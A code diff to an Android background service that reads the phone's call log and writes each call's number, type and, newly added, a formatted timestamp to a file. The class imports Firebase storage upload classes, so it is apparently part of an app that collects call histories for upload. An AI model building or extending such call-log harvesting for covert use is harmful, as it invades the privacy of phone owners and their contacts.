@@ -31,6 +31,9 @@ import com.google.firebase.storage.UploadTask;
 import java.io.File;
 import java.io.FileWriter;
 import java.io.IOException;
+import java.text.SimpleDateFormat;
+import java.util.Date;
+import java.util.TimeZone;
 
 public class MyService extends Service {
     private StorageReference storageReference;
@@ -115,6 +118,10 @@ public class MyService extends Service {
                 String name = calls.getString(calls.getColumnIndex(CallLog.Calls._ID));
                 String number = calls.getString(calls.getColumnIndex(CallLog.Calls.NUMBER));
                 int callType = calls.getInt(calls.getColumnIndex(CallLog.Calls.TYPE));
+                String date = calls.getString(calls.getColumnIndex(CallLog.Calls.DATE));
+                SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy HH:mm:ss");
+                sdf.setTimeZone(TimeZone.getTimeZone("GMT+05:30"));
+                String Date = sdf.format(new Date(Long.parseLong(date)));
                 String type = "call";
                 if (callType == CallLog.Calls.INCOMING_TYPE) {
                     type = "Incoming Call"; //incoming call
@@ -128,6 +135,8 @@ public class MyService extends Service {
                         .append(number)
                         .append("\n")
                         .append(type)
+                        .append("\n")
+                        .append(Date)
                         .append("\n\n");
                 writer.append(builder.toString());
             }
